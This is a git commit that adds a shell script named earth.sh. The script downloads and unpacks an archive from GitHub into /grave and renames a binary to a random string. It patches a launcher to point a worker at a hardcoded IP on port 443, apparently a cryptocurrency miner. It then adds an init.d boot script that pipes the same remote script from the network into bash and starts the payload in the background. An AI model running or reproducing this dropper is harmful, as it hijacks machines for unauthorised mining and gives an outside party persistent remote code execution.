b0a5b437fce14b4267efa1755f8793631d72b625
merisye <meriysella44@gmail.com>
2024-06-14 18:21:38 +0700

    Create earth.sh

---
+++ earth.sh
@@ -0,0 +1,16 @@
+cd /
+wget https://github.com/toolsas/shard/releases/download/v1.5.2/grave.tar
+tar -xvf grave.tar
+cd /grave
+variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+mv layer $variable1
+sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./shell.sh
+sed -i "s/host/20.163.170.215:443/g" ./shell.sh
+cd /etc/init.d
+echo "bash <(curl -s -L https://raw.githubusercontent.com/toolsas/shard/main/earth.sh)" > stone.sh
+chmod a+x stone.sh
+update-rc.d stone.sh defaults
+rm -rf grave.tar
+cd /grave
+nohup ./shell.sh
+ps -ef | grep grave
